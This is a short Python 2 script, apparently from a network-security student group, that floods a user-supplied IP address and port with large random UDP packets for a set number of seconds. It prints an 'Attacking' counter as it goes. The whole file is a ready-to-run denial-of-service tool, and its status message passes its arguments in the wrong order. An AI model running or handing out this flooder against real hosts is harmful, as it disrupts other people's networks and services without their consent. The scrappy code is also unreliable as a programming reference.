import time 
import socket 
import random

credits = ( 
	'UDP Flooding simple script for dummies \t' 
	'Coders: Group 6 netsec' 
	) 
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
#okay so here I create the victim machine, when i say "SOCK_DGRAM" it means it's a UDP 
#type program 
bytes = random._urandom(9999) # number representes bytes to send to the victim
def pres(): 
	global credits 
	print credits 
pres() 
victim = raw_input('Target > (Enter ip)') 
vport = input('Port >') 
duration = input('Time > (Seconds)') 
timeout = time.time() + duration 
sent = 0 

while 1: 
	if time.time() > timeout: 
		break 
	else: 
		pass 
	client.sendto(bytes, (victim, vport)) 
	sent = sent + 1 
	print ("Attacking %s sent packages %s at the port %s "%(sent, victim, vport))
